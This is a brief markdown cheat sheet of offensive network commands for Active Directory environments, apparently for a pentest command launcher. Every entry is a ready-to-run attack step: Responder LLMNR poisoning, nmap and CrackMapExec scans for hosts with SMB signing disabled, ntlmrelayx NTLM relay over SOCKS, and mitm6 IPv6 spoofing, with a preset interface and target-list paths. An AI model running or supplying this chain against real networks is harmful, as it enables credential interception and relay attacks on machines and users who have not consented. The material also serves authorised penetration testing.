# Spoofing

## Responder - LLMNR Poisoning

```
responder-http-on
responder-smb-on
responder -I <interface> -d -w
```

= interface: enp0s31f6

## SMB signing disabled - nmap

```
nmap -Pn --script smb-security-mode -p445 <target>
```

= target: $TARGETS/computers.list

## SMB signing disabled - cme

```
cme smb <target> --gen-relay-list <output_file>
```

= target: $TARGETS/computers.list

## Responder - Relay

```
responder-http-off
responder-smb-off
responder -I <interface> -d -w
```

= interface: enp0s31f6

## NTLM Relay with SOCKS (SMB)

```
ntlmrelayx -tf <targets_file> -socks -smb2support
```

= targets_file: $TARGETS/relay_targets.list

## mitm6 for NTLM Relay

```
mitm6 --interface <interface> --domain <domain>
```

= interface: enp0s31f6
= domain: